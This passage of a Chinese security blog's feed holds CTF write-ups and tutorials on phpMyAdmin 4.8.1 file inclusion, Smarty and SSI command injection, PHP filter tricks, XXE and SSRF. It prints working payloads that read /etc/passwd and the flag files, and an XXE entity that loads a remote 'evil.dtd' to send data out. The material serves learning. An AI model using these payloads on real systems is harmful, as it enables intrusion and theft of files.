class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br><span class="line"></span><br><span class="line">&#123;%for message in get_flashed_messages()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;message&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01-简介&quot;&gt;&lt;a href=&quot;#0x01-简介&quot; class=&quot;headerlink&quot; title=&quot;0x01:简介&quot;&gt;&lt;/a&gt;0x01:简介
    
    </summary>
    
    
    
      <category term="模板注入" scheme="http://yoursite.com/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin4.8.1任意文件包含</title>
    <link href="http://yoursite.com/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yoursite.com/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2020-02-07T10:36:39.000Z</published>
    <updated>2020-03-12T01:23:19.142Z</updated>
    
    <content type="html"><![CDATA[<p>phpmyadmin简述：<a id="more"></a></p><p>phpMyAdmin 是一个以PHP为基础，以Web-Base方式架构在网站主机上的MySQL的数据库管理工具，让管理者可用Web接口管理MySQL数据库。借由此Web接口可以成为一个简易方式输入繁杂SQL语法的较佳途径，尤其要处理大量资料的汇入及汇出更为方便。其中一个更大的优势在于由于phpMyAdmin跟其他PHP程式一样在网页服务器上执行，但是您可以在任何地方使用这些程式产生的HTML页面，也就是于远端管理MySQL数据库，方便的建立、修改、删除数据库及资料表。也可借由phpMyAdmin建立常用的php语法，方便编写网页时所需要的sql语法正确性。</p><p>0x01影响版本</p><p>phpmyadmin4.8.1</p><p>0x02漏洞分析</p><p>下面的内容借鉴了ChaMd5安全团队的文章，附上链接：<code>https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">        $_page = mb_substr(</span><br><span class="line">            $_page,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>​    总的来说呢，问题就出现在这一块代码，可以利用这个函数来进行绕过白名单检测，？两次url编码为%253f就可以绕过验证</p><p>0x03例题分析</p><p>下面是一道buuctf上的题目:warmup</p><p>打开题目出现的是一个表情，直接来看网页的源码，发现了提示有source.php的文件</p><img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1.png" class="" title="examplename"><p>访问source.php，看到了源码</p><img src="/2020/02/07/phpmyadmin4-8-1%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/2.png" class="" title="examplename"><p>做这道题目的时候其实我并不知道这是phpmyadmin4.8.1漏洞，所以当时找了一篇wp</p><p>在学习了这个漏洞之后，大概就清楚了这段代码是什么意思，很明显这里有我在上面附上的那段代码，那么就可以直接来构造payload了，对了要先访问hint.php会得到提示说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>所以，payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://efeb72fa-cfeb-4026-8537-6857f5beace4.node3.buuoj.cn/index.php?file=hint.php%253f../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>这样就得到了flag:<code>flag{658a2242-c7eb-42fe-8856-76b69e728c0f}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;phpmyadmin简述：
    
    </summary>
    
    
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>BJDCTFwp</title>
    <link href="http://yoursite.com/2020/01/17/BJDCTFwp/"/>
    <id>http://yoursite.com/2020/01/17/BJDCTFwp/</id>
    <published>2020-01-17T08:15:06.000Z</published>
    <updated>2020-03-12T01:27:44.125Z</updated>
    
    <content type="html"><![CDATA[<p>Misc</p><ol><li>签个到？<a id="more"></a></li></ol><p>文件下载下来是个压缩包，解压缩发现里面还有一个压缩包，直接解压提示文件损坏解压失败</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B0.png" class="" title="examplename"><p>不假思索，直接丢到kali里面，foremost一下，分离出了一张图片，打开是二维码，扫一扫，拿到Flag</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B01.png" class="" title="examplename"><ol start="2"><li>你猜我是个啥？</li></ol><p>下载过来是一个压缩包，发现打不开，想到可能是文件后缀的问题，丢到winhex里面发现了是png图片，正想要改后缀的时候，把winhex直接拉到底发现了Flag</p><img src="/2020/01/17/BJDCTFwp/cai.png" class="" title="examplename"><ol start="3"><li>鸡你太美</li></ol><p>压缩包解压，一个是gif，一个是它的副本，把gif文件丢到winhex里面，没有发现什么有用的东西。本着试试的想法，把副本丢到winhex里面，发现最开头有9a，再想到前面的是gif文件，gif文件头刚好是GIF89a，把文件头补全重新保存为GIF文件，Flag出来了。</p><img src="/2020/01/17/BJDCTFwp/%E9%B8%A1%E5%A4%AA%E7%BE%8E.png" class="" title="examplename"><ol start="4"><li>just a rar</li></ol><p>下载下来是一个压缩包，里面有一个四位数.rar的文件，直接上工具进行爆破.</p><img src="/2020/01/17/BJDCTFwp/rar.png" class="" title="examplename"><p>密码是2016，打开解压缩得到一张图片，放到winhex里面什么东西都没有，放到kali里，binwalk，foremost都没有什么东西</p><p>突然想到以前做过的一道题，打开属性，在备注里找到了flag</p><img src="/2020/01/17/BJDCTFwp/rar1.png" class="" title="examplename"><p>Crypto</p><ol><li>sign in</li></ol><p>打开是这样的<img src="/2020/01/17/BJDCTFwp/signin1.png" class="" title="examplename"></p><p>把base16，64，32挨个试一下，是base16加密</p><p>找一个线解密网站</p><img src="/2020/01/17/BJDCTFwp/signin.png" class="" title="examplename"><ol start="2"><li>编制与调制</li></ol><p>打开下载文件得到一个txt文件和一个带hint的图片，根据hint的图片猜测是曼彻斯特加密</p><p>网上搜到了一个脚本，拿过来跑一下就出来了</p><img src="/2020/01/17/BJDCTFwp/%E7%BC%96%E5%88%B6.png" class="" title="examplename"><ol start="3"><li>Polybius</li></ol><p>打开文件</p><img src="/2020/01/17/BJDCTFwp/polybius.png" class="" title="examplename"><p>Hintbase64解密得到提示明文是16位数字</p><p>百度了一下找到了对应的棋盘加密，不过棋盘有改动，想到flag大多是一句话，那就一个个试</p><img src="/2020/01/17/BJDCTFwp/%E6%A3%8B%E7%9B%98.jpg" class="" title="examplename"><p>手动对应解密，得到flag：BJD{flagispolybius}</p><p>4.EASYRSA</p><img src="/2020/01/17/BJDCTFwp/RSA1.png" class="" title="examplename"><p>打开拿到的一段代码，上网搜了一下有关RSA加密的知识，再找了一个可攻击的脚本来进行反解先得到p和q，再来解m的值，最后long_to_bytes(m)就可以得到flag了</p><img src="/2020/01/17/BJDCTFwp/rsa.png" class="" title="examplename"><p>Web</p><p>1.Hello World</p><p>打开题目地址，点击sketch included，就是界面开始的那个，出现文字注意你的id，用burp suite抓包，根据放出来的hint是id与admin有关</p><p>同时在burp中看到id的格式，在请求头中添加id:admin+base64(admin),send一下，返回如下</p><img src="/2020/01/17/BJDCTFwp/hello4.png" class="" title="examplename"><p>X-Forwarded-For:127.0.0.1</p><img src="/2020/01/17/BJDCTFwp/hello1.png" class="" title="examplename"><p>Referer:<a href="https://google.com" target="_blank" rel="noopener">https://google.com</a></p><img src="/2020/01/17/BJDCTFwp/hello2.png" class="" title="examplename"><p>2.easy_upload</p><p>上传一句话木马，以jpg格式上传，访问提示给的地址</p><img src="/2020/01/17/BJDCTFwp/upload2.png" class="" title="examplename"><p>参考了一篇博客，学到了直接读取文件中的内容</p><img src="/2020/01/17/BJDCTFwp/upload.png" class="" title="examplename"><p>3.Hidden serects</p><p>抓一下包，可以发现有一段password</p><img src="/2020/01/17/BJDCTFwp/hidden.png" class="" title="examplename"><p>通过尝试发现是md5加密</p><p>解密登录网站</p><p>打开发现还是没什么东西，F12和ctrl键都不能用</p><p>这里我用了一个插件叫restclient,找到flag</p><img src="/2020/01/17/BJDCTFwp/hidden1.png" class="" title="examplename"><p>4.easy md5</p><p>抓一下包，在反应头里有一个hint</p><img src="/2020/01/17/BJDCTFwp/MD51.png" class="" title="examplename"><p>根据树哥的一篇md5博客照着写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98&#x2F;](https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5的一系列问题&#x2F;)</span><br></pre></td></tr></table></figure><p>先提交ffifdyop，查看页面源码</p><img src="/2020/01/17/BJDCTFwp/MD52.png" class="" title="examplename"><p>发现是md5弱比较</p><p>构造payload?a=QNKCDZO&amp;b=aabg7XSs，得到</p><img src="/2020/01/17/BJDCTFwp/MD53.png" class="" title="examplename}强比较，没有规定字符串如果这个时候传入的是数组不是字符串，md5（）函数无法解出其数值并且不会报错，就会得到数值相等 {%asset_img md54.png examplename"><p>5.Mark loves cat</p><p>打开题目地址，没发现什么</p><p>用敏感目录扫描工具 syc-scan</p><p>python3 syc.py <a href="http://222.186.56.247:8105/" target="_blank" rel="noopener">http://222.186.56.247:8105/</a></p><p>发现存在git泄露</p><p>用git_extract 工具进行恢复</p><p>python git_extract.py <a href="http://222.186.56.247:8105/.git/" target="_blank" rel="noopener">http://222.186.56.247:8105/.git/</a></p><p>在目录下生成了一个新的文件，打开是</p><img src="/2020/01/17/BJDCTFwp/mark.png" class="" title="examplename"><p>要绕过这三个条件才能得到flag</p><p>构造payload：?arc=flag&amp;flag=arc&amp;_GET=ntr post请求:_POST[flag]=fuck</p><img src="/2020/01/17/BJDCTFwp/mark2.png" class="" title="examplename"><ol start="6"><li>这序列化也太简单了吧</li></ol><p>是一道反序列化题</p><p>在网上找了好多博客研究了半天，搞懂了一点一点</p><img src="/2020/01/17/BJDCTFwp/se1.png" class="" title="examplename"><p>把传入的序列化字符串的属性个数更改成大于 1 的任何数来绕过_wakeup()</p><img src="/2020/01/17/BJDCTFwp/se.png" class="" title="examplename"><p>7.zjctf</p><p>通过text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=写入那句话,再用file=php://filter/read=convert.base64-encode/resource=next.php以base64的方式读取文件，base64解密得到next.php文件</p><p>通过测试/next.php?\S*=${getFlag()}&amp;cmd=system(“cd ../../../;ls”)发现根目录下有flag</p><p>构造payload：/next.php?\S*=${getFlag()}&amp;cmd=system(“cat /flag”)</p><img src="/2020/01/17/BJDCTFwp/zjctf.png" class="" title="examplename"><p>8.The_mystery_of_ip</p><p>点击flag出现了ip，抓包</p><p>猜测可能是smarty模板注入，改一下x-forwarded-for:{if phpindfo()}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip1.png" class="" title="examplename"><p>底下成功显示了phpinfo的页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改x-forwarded-for的值查询列表：X-Forwarded-For: {if system(‘ls’)}{/if}</p><p>可以发现出现了当前目录下的文件</p><p>X-Forwarded-For: {if system(“cd ../../../;ls”)}{/if}向上层文件遍历目录</p><img src="/2020/01/17/BJDCTFwp/ip2.png" class="" title="examplename"><p>发现了flag文件，接下来就是读取X-Forwarded-For: {if system(“cat /flag”)}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip3.png" class="" title="examplename"><p>9.easy_search</p><p>根据hint是vim泄漏，<a href="http://222.186.56.247:8107/index.php.swp可以看到源码，根据源码得出登录密码为2020666" target="_blank" rel="noopener">http://222.186.56.247:8107/index.php.swp可以看到源码，根据源码得出登录密码为2020666</a></p><p>账号随便输一个，写上密码，burp抓包</p><p>看到有一个url_is_here</p><p>猜测是ssi注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easy_search.png" class="" title="examplename"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easysearch2.png" class="" title="examplename"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#execcmd&#x3D;&quot;cat..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/search3.png" class="" title="examplename">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Misc&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;签个到？
    
    </summary>
    
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞</title>
    <link href="http://yoursite.com/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-01-16T06:32:30.000Z</published>
    <updated>2020-02-09T00:50:10.331Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-什么是XXE漏洞"><a href="#1-什么是XXE漏洞" class="headerlink" title="1.什么是XXE漏洞"></a>1.什么是XXE漏洞<a id="more"></a></h4><p>XXE漏洞全称为XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害</p><p>DTD:文档类型定义</p><p>DTD实体<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：%实体名；</p><p>1，内部实体声明:<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; ex:&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p><p>  注意和DTD中的元素声明区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 声明元素&gt;</span><br></pre></td></tr></table></figure><p><strong>2，外部实体声明:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE的攻击与危害（XML-External-Entity）"><a href="#XXE的攻击与危害（XML-External-Entity）" class="headerlink" title="XXE的攻击与危害（XML External Entity）"></a>XXE的攻击与危害（XML External Entity）</h2><h4 id="1，何为XXE"><a href="#1，何为XXE" class="headerlink" title="1，何为XXE?"></a>1，何为XXE?</h4><p>答： xxe也就是xml外部实体注入。也就是上文中加粗的那一部分。</p><h4 id="2，怎样构建外部实体注入？"><a href="#2，怎样构建外部实体注入？" class="headerlink" title="2，怎样构建外部实体注入？"></a>2，怎样构建外部实体注入？</h4><p>方式一：直接通过DTD外部实体声明<br>XML内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明<br>XML内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://mark4z5.com/evil.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;B;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>方式三：通过DTD外部实体声明引入外部实体声明<br>好像有点拗口，其实意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明<br>具体看例子,XML内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure><p>dtd文件内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="产生哪些危害？"><a href="#产生哪些危害？" class="headerlink" title="产生哪些危害？"></a>产生哪些危害？</h4><p>XXE危害1：读取任意文件</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145026738-1407663000.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145035082-1171815922.png" alt="img"></p><p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p><p>另外，数据不回显就没有问题了吗？如下图</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145050972-1215502458.png" alt="img"></p><p>不，可以把数据发送到远程服务器</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145104285-1507820174.png" alt="img"></p><p>远程evil.dtd文件内容如下</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145111863-976147511.png" alt="img"></p><p>触发XXE攻击后，服务器会把文件内容发送到攻击者网站</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145120957-1229784360.png" alt="img"></p><p>XXE危害2：执行系统命令</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145129957-1907303428.png" alt="img"></p><p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><p>XXE危害3：探测内网端口</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145153722-1549362415.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145204847-766408731.png" alt="img"></p><p>该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p><p>XXE危害4：攻击内网网站</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145220472-216779729.png" alt="img"></p><p>该CASE是攻击内网struts2网站，远程执行系统命令。</p><p>(XXE的危害与攻击部分用的是下面这篇博客的材料，这里附上出处)<br>原文链接：<a href="https://blog.csdn.net/qq_40491569/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83066200</a></p><p>读取ip:file:///proc/net/arp</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-什么是XXE漏洞&quot;&gt;&lt;a href=&quot;#1-什么是XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;1.什么是XXE漏洞&quot;&gt;&lt;/a&gt;1.什么是XXE漏洞
    
    </summary>
    
    
    
      <category term="XXE" scheme="http://yoursite.com/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>ssrf</title>
    <link href="http://yoursite.com/2020/01/16/ssrf/"/>
    <id>http://yoursite.com/2020/01/16/ssrf/</id>
    <published>2020-01-16T02:55:29.000Z</published>
    <updated>2020-01-16T08:04:30.233Z</updated>
    
    <content type="html"><![CDATA[<h4 id="SSRF漏洞介绍："><a href="#SSRF漏洞介绍：" class="headerlink" title="SSRF漏洞介绍："></a>SSRF漏洞介绍：<a id="more"></a></h4><p>　　SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><h4 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h4><p>　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><h4 id="SSRF漏洞利用手段："><a href="#SSRF漏洞利用手段：" class="headerlink" title="SSRF漏洞利用手段："></a>SSRF漏洞利用手段：</h4><p>　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</p><p>　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；</p><p>　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；</p><p>　　4.攻击内网或外网有漏洞的Web应用；</p><p>　　5.使用file：///协议读取本地文件(或其他协议）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;192.168.1.10:3306</span><br><span class="line"></span><br><span class="line">　　http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h4 id="SSRF漏洞出现点："><a href="#SSRF漏洞出现点：" class="headerlink" title="***SSRF漏洞出现点："></a>***SSRF漏洞出现点：</h4><p>　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　</p><p>　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）</p><p>　　3.在线翻译</p><p>　　4.图片加载与下载：通过URL地址加载或下载图片</p><p>　　5.图片、文章收藏功能</p><p>　　6.未公开的api实现及调用URL的功能</p><p>　　7.从URL关键字中寻找</p><h4 id="SSRF漏洞绕过方法："><a href="#SSRF漏洞绕过方法：" class="headerlink" title="***SSRF漏洞绕过方法："></a>***SSRF漏洞绕过方法：</h4><p>　　1.@　　　　　　　　　　<a href="http://abc.com@127.0.0.1" target="_blank" rel="noopener">http://abc.com@127.0.0.1</a></p><p>　　2.添加端口号　　　　　　<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>　　3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD" target="_blank" rel="noopener">https://0x9.me/cuGfD</a></p><p>　　4.可以指向任意ip的域名　 xip.io</p><p>　　5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制）</p><p>　　6.非HTTP协议</p><p>　　7.DNS Rebinding</p><h3 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="***SSRF漏洞的验证"></a>***SSRF漏洞的验证</h3><p>我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p><p>可以用Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含<a href="http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。</a></p><p>在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</p><p>此处找内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址过滤绕过</p><p>@：<br><a href="http://www.baidu.com@10.10.10.10与http?/10.10.10.10" target="_blank" rel="noopener">http://www.baidu.com@10.10.10.10与http?/10.10.10.10</a> 请求是相同的</p><p>过滤绕过<br>IP地址转换成十进制：<br>127.0.0.1=2130706433</p><h4 id="SSRF漏洞绕过方法：-1"><a href="#SSRF漏洞绕过方法：-1" class="headerlink" title="SSRF漏洞绕过方法："></a>SSRF漏洞绕过方法：</h4><p>　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.基本判断（排除法）</span><br><span class="line"></span><br><span class="line">　　如：http:&#x2F;&#x2F;www.douban.com&#x2F;***&#x2F;service?image&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png</span><br><span class="line"></span><br><span class="line">　　排除法一：直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png，说明不存在SSRF漏洞。</span><br><span class="line"></span><br><span class="line">　　排除法二：使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;SSRF漏洞介绍：&quot;&gt;&lt;a href=&quot;#SSRF漏洞介绍：&quot; class=&quot;headerlink&quot; title=&quot;SSRF漏洞介绍：&quot;&gt;&lt;/a&gt;SSRF漏洞介绍：
    
    </summary>
    
    
    
      <category term="ssrf" scheme="http://yoursite.com/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>逻辑绕过WAF</title>
    <link href="http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87WAF/"/>
    <id>http://yoursite.com/2020/01/15/%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87WAF/</id>
    <published>2020-01-15T12:46:57.000Z</published>
    <updated>2020-01-16T08:04:18.502Z</updated>
    
